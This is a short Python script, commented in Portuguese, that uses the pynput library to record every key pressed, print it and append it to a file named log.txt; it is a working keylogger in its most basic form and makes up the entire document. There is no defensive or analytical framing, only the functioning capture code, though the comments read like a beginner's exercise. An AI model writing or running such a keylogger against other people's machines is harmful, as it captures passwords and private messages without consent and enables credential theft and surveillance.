from pynput import keyboard

def ao_pressionar(tecla):
    ## Convertemos a tecla para string
    escrita = str(tecla)
    print (escrita)
    ## "a" significa 'append' (anexar), adiciona ao fim do ficheiro
    with open("log.txt", "a") as f:
        f.write(escrita)
    
    ## O "ouvinte" principal
with keyboard.Listener(on_press=ao_pressionar) as ouvinte:
    ouvinte.join()
    
